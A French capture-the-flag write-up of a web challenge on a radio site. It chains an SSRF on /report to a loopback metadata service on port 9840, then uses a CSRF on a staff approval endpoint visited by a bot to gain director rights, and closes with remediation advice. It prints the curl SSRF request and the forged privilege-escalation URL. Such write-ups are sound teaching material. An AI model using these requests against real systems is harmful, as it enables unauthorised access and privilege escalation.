# Radio Kloto — une SSRF vers la metadata, puis un bot CSRF pour la promotion

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/radio-kloto/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Je crée un compte auditeur, puis `POST /report` suit l'URL que je
> lui donne : SSRF. Je la pointe sur un service de metadata en boucle locale
> (port 9840) qui me rend une clé et une note sur un bot d'approbation sensible
> au CSRF. Je fais mordre le bot sur `/staff/quick-approve?...&grade=DIR`, ce qui
> me promeut directeur et ouvre `/direction` et son flag. **Flag :** `NCTF{…}`.

## 1. Briefing

Challenge web de la finale : une webradio avec des rôles (auditeur, staff,
direction). Le flag est derrière `/direction`, réservé au grade directeur.

## 2. Reconnaissance

Je m'inscris comme simple auditeur et je récupère mon identité :

```
GET /api/me → {"uuid":"...","grade":"auditeur"}
```

Un endpoint `POST /report` attire l'œil : il accepte une URL et va la chercher
côté serveur. URL contrôlée par moi + fetch serveur = SSRF à tester.

## 3. Analyse

Deux faiblesses à chaîner :

1. **SSRF** sur `/report` : le serveur suit l'URL, y compris vers `127.0.0.1`.
2. **CSRF** sur un endpoint staff `GET /staff/quick-approve` qu'un bot interne
   visite — il applique les paramètres sans vérifier l'origine.

La SSRF me sert à lire la metadata interne (qui décrit le bot et la clé) ; le
CSRF me sert à utiliser ce bot pour me promouvoir.

## 4. Exploitation

### Étape 1 — SSRF vers la metadata loopback

```bash
curl -s -X POST http://HOST:PORT/report \
  -d 'url=http://127.0.0.1:9840/'
```

Le service de metadata me rend une clé et une note décrivant
`/staff/quick-approve` (le bot d'approbation) et ses paramètres.

### Étape 2 — CSRF : faire promouvoir mon compte

Je forge l'URL d'approbation avec mon UUID et le grade directeur, et je la place
là où le bot staff la déclenchera :

```
GET /staff/quick-approve?user=<mon-uuid>&grade=DIR&<clé>
```

Le bot la visite, applique `grade=DIR` à mon compte.

### Étape 3 — accéder à /direction

```bash
curl -s -b session http://HOST:PORT/direction   # flag
```

## 5. Flag

```text
NCTF{…}
```

## 6. Leçons & remédiation

- **SSRF** : valider et restreindre les URL sortantes de `/report` ; interdire la
  boucle locale et les plages internes, ne pas exposer de metadata en confiance
  sur `127.0.0.1`.
- **CSRF** : exiger un jeton anti-CSRF et vérifier l'origine sur
  `/staff/quick-approve` ; un bot interne ne doit pas appliquer un changement de
  rôle à partir d'une simple requête GET.
- **Élévation de privilège** : le grade ne devrait jamais être pilotable par un
  paramètre de requête non autorisé.
